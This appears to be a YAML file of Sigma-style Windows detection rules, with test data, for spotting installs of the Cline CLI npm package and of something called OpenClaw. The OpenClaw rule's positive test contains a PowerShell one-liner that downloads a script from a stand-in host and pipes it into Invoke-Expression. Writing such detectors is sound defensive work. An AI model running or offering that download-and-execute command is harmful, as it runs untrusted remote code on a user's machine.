rules:
    - title: Detect Cline CLI Package Installation
      description: Detects installation of Cline CLI npm package.
      logsource:
        category: process_creation
        product: windows
      detection:
        condition: selection
        selection:
            CommandLine|contains: npm install cline
      level: informational
      tags:
        - attack.supply_chain
        - attack.t1195
      tests:
        positive:
            - name: Cline install via npm
              data:
                - CommandLine: npm install cline
                - Image: C:\Program Files\nodejs\npm.cmd
        negative:
            - name: Installing other package
              data:
                - CommandLine: npm install express
                - Image: C:\Program Files\nodejs\npm.cmd
    - title: Detect Potential OpenClaw Installation
      description: Detects potential OpenClaw installation via suspicious process execution.
      logsource:
        category: process_creation
        product: windows
      detection:
        condition: selection
        selection:
            CommandLine|contains: openclaw
      level: high
      tags:
        - attack.installation
        - attack.t1566.001
      tests:
        positive:
            - name: OpenClaw install command
              data:
                - CommandLine: powershell -c Invoke-WebRequest -Uri http://example.com/openclaw.ps1 | Invoke-Expression
                - Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        negative:
            - name: Legitimate powershell usage
              data:
                - CommandLine: powershell -version
                - Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
